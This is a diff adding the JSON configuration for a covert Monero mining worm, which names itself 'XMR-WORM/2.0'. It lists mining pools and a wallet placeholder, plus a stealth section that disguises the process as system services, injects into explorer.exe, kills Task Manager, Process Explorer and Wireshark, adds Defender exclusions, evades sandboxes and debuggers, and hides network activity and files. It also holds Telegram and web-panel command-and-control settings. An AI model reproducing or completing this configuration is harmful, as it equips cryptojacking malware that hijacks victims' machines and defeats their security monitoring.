@@ -1,0 +1,138 @@
+{
+    "wallet": "YOUR_XMR_WALLET_ADDRESS",
+    "password": "x",
+    "pools": [
+        {
+            "url": "stratum+ssl://pool.supportxmr.com:443",
+            "priority": 1,
+            "location": "EU",
+            "enabled": true
+        },
+        {
+            "url": "stratum+ssl://xmrpool.eu:5555",
+            "priority": 2,
+            "location": "EU",
+            "enabled": true
+        },
+        {
+            "url": "stratum+tcp://pool.minexmr.com:4444",
+            "priority": 3,
+            "location": "US",
+            "enabled": true
+        }
+    ],
+    "mining": {
+        "max_threads": 0,
+        "reserved_cores": 1,
+        "max_cpu_usage": 90,
+        "randomx": {
+            "enabled": true,
+            "huge_pages": true,
+            "jit": true,
+            "avx512": true,
+            "cache_size_mb": 2080,
+            "numa_aware": true,
+            "dataset_prefetch": true,
+            "memory_optimization": true,
+            "cpu_feature_detection": true,
+            "thread_local_storage": true
+        },
+        "gpu": {
+            "enabled": false,
+            "platform": "cuda",
+            "device_id": 0,
+            "threads_per_block": 256
+        },
+        "performance": {
+            "batch_size": 10000,
+            "nonce_stride": 1,
+            "hash_verification": true,
+            "stats_collection": true,
+            "connection_pooling": true,
+            "non_blocking_io": true
+        }
+    },
+    "network": {
+        "connection_timeout": 30,
+        "read_timeout": 60,
+        "reconnect_delay": 5,
+        "user_agent": "XMR-WORM/2.0",
+        "ssl": {
+            "enabled": true,
+            "verify_certificate": false
+        },
+        "tor": {
+            "enabled": false,
+            "socks5_host": "127.0.0.1",
+            "socks5_port": 9050
+        }
+    },
+    "stealth": {
+        "hide_process": true,
+        "process_names": [
+            "[kworker/0:0]",
+            "svchost.exe",
+            "systemd-resolved"
+        ],
+        "rename_interval_seconds": 300,
+        "process_injection": {
+            "enabled": true,
+            "target": "explorer.exe",
+            "method": "remote_thread"
+        },
+        "watchdog": {
+            "enabled": true,
+            "check_interval": 5,
+            "kill_processes": [
+                "taskmgr.exe",
+                "procexp.exe",
+                "wireshark.exe",
+                "procmon.exe"
+            ],
+            "pause_on_detection": true
+        },
+        "idle_detection": true,
+        "idle_threshold_seconds": 300,
+        "defender_bypass": {
+            "enabled": true,
+            "add_exclusion": true,
+            "disable_realtime": false
+        },
+        "sandbox_detection": true,
+        "sandbox_exit": true,
+        "advanced_stealth": {
+            "enabled": true,
+            "hide_network": true,
+            "hide_files": true,
+            "anti_debug": true,
+            "ld_preload_hooking": true
+        }
+    },
+    "remote_config": {
+        "enabled": false,
+        "url": "https://your-panel.com/api/config",
+        "auth_token": "",
+        "update_interval": 600
+    },
+    "c2": {
+        "telegram": {
+            "enabled": false,
+            "bot_token": "YOUR_BOT_TOKEN",
+            "chat_id": "YOUR_CHAT_ID"
+        },
+        "web_panel": {
+            "enabled": false,
+            "url": "https://your-panel.com",
+            "api_key": ""
+        }
+    },
+    "advanced": {
+        "log_file": "/tmp/.systemd-private-xxxxx",
+        "stats_report_interval": 60,
+        "auto_update": false,
+        "update_url": "",
+        "memory_pool_size": 2048,
+        "optimization_level": "aggressive",
+        "enable_all_optimizations": true
+    }
+}
